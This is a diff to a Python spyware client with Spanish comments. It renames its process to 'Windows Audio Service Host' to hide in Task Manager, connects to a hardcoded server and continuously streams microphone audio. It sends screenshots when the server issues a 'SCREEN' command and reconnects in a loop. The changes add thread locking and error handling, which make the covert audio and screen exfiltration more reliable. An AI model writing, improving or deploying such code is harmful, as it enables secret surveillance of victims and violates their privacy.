@@ -6,44 +6,44 @@ import io
 import time
 import sys
 import setproctitle
-from PIL import Image
 
 # --- Configuración ---
-setproctitle.setproctitle("Windows Audio Service Host") # Nombre en Task Manager
-IP_DEL_SERVIDOR = '192.168.36.247'  # <--- CAMBIA ESTO POR LA IP DE TU SERVIDOR
-PUERTO = 5000
+setproctitle.setproctitle("Windows Audio Service Host") 
+IP_DEL_SERVIDOR = '192.168.36.247' # <--- Asegúrate que esta IP sea la correcta
+PUERTO = 5001
 CHUNK = 1024
 FORMAT = pyaudio.paInt16
 CHANNELS = 1
 RATE = 44100
 
+# EL CANDADO: Evita que el audio y la imagen se mezclen en el "cable" (socket)
+socket_lock = threading.Lock()
+
 def capturar_y_enviar_pantalla(sock):
-    """Captura la pantalla, la comprime y la envía al servidor."""
+    """Captura y envía la pantalla asegurando exclusividad del socket."""
     try:
-        # Tomar captura
         screenshot = pyautogui.screenshot()
-        
-        # Convertir a bytes (JPEG para velocidad)
         buffer = io.BytesIO()
-        screenshot.save(buffer, format="JPEG", quality=40) # Calidad baja para que sea instantáneo
+        screenshot.save(buffer, format="JPEG", quality=40)
         img_bytes = buffer.getvalue()
         
-        # Protocolo: Enviar prefijo 'IMG:' seguido del tamaño (4 bytes) y luego los datos
-        sock.sendall(b"IMG:") 
-        sock.sendall(len(img_bytes).to_bytes(4, byteorder='big'))
-        sock.sendall(img_bytes)
+        with socket_lock: # Bloqueamos el socket para que el audio no interfiera
+            sock.sendall(b"IMG:") 
+            sock.sendall(len(img_bytes).to_bytes(4, byteorder='big'))
+            sock.sendall(img_bytes)
+        print("[*] Captura enviada con éxito.")
     except Exception as e:
-        print(f"Error en captura: {e}")
+        print(f"[-] Error en captura: {e}")
 
 def flujo_audio(sock, stream):
-    """Hilo dedicado exclusivamente a enviar el audio sin interrupciones."""
+    """Hilo de audio con manejo de errores y bloqueo de seguridad."""
     try:
         while True:
             data = stream.read(CHUNK, exception_on_overflow=False)
-            # Enviamos prefijo 'AUD:' para que el servidor sepa que es audio
-            sock.sendall(b"AUD:" + data)
-    except:
-        pass
+            with socket_lock: # Si se está enviando una foto, el audio espera aquí
+                sock.sendall(b"AUD:" + data)
+    except Exception as e:
+        print(f"[-] Error en flujo de audio: {e}")
 
 def iniciar_cliente():
     p = pyaudio.PyAudio()
@@ -51,31 +51,32 @@ def iniciar_cliente():
     while True:
         client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         try:
+            print(f"[*] Intentando conectar a {IP_DEL_SERVIDOR}...")
             client_socket.connect((IP_DEL_SERVIDOR, PUERTO))
+            print("[+] Conectado al servidor.")
             
-            # Configurar Micrófono
             stream = p.open(format=FORMAT, channels=CHANNELS, rate=RATE, 
                             input=True, frames_per_buffer=CHUNK)
 
-            # 1. Iniciar hilo de audio
+            # Iniciar hilo de audio
             thread_audio = threading.Thread(target=flujo_audio, args=(client_socket, stream), daemon=True)
             thread_audio.start()
 
-            # 2. Bucle principal: Escuchar comandos del servidor
+            # Bucle de comandos
             while True:
-                # El cliente espera recibir comandos (ej: b"SCREEN")
                 comando = client_socket.recv(1024).decode('utf-8', errors='ignore')
-                
-                if "SCREEN" in comando:
-                    capturar_y_enviar_pantalla(client_socket)
-                
                 if not comando: break
                 
-        except (ConnectionRefusedError, socket.timeout, OSError, ConnectionResetError):
-            time.sleep(10) # Reintento cada 10 segundos si falla
-        except KeyboardInterrupt:
-            p.terminate()
-            sys.exit()
+                if "SCREEN" in comando:
+                    # Usamos un hilo para no congelar la recepción de otros comandos
+                    threading.Thread(target=capturar_y_enviar_pantalla, args=(client_socket,), daemon=True).start()
+                
+        except (ConnectionRefusedError, socket.error):
+            print("[-] Servidor no disponible. Reintentando en 5 segundos...")
+            time.sleep(5) # Delay para evitar el bucle infinito de logs
+        except Exception as e:
+            print(f"[-] Error inesperado: {e}")
+            time.sleep(5)
         finally:
             client_socket.close()
 
